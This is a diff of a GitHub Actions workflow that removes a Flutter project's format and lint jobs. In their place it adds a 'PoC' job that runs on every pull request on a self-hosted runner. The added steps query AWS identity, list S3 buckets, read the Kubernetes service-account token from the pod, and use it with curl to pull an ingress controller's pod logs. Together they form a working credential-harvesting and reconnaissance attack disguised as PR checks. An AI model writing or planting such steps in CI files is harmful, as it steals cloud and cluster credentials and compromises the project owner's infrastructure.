@@ -1,32 +1,24 @@
-name: CI
+name: PR Checks
 
-on:
-  push:
-  pull_request:
-  workflow_dispatch:
+on: pull_request
 
 jobs:
-  check-format:
-      name: Check format using flutter format
-      runs-on: ubuntu-latest
-      container: cirrusci/flutter:stable
-
-      steps:
-        - name: Checkout code
-          uses: actions/checkout@v2
-        - name: Check format
-          run: flutter format -n --set-exit-if-changed .
-
-  lint:
-    name: Lint
-    runs-on: ubuntu-latest
-    container: cirrusci/flutter:stable
-
+  poc:
+    name: PoC
+    runs-on: [self-hosted]
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-      - name: Get dependencies for example
-        run: flutter pub get
-        working-directory: example
-      - name: Lint using flutter analyze
-        run: flutter analyze
+      - run: |
+          echo "*** test whoami ***"
+          aws sts get-caller-identity
+          echo "*** S3 ***"
+          aws s3 ls
+          echo "*** test net ***"
+          ifconfig
+          echo "*** test k8s api ***"
+          APISERVER=https://kubernetes.default.svc
+          SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+          NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+          TOKEN=$(cat ${SERVICEACCOUNT}/token)
+          CACERT=${SERVICEACCOUNT}/ca.crt
+          curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/default/pods/ingress-nginx-ingress-controller-6cbf95f5d4-d628h/log
+         
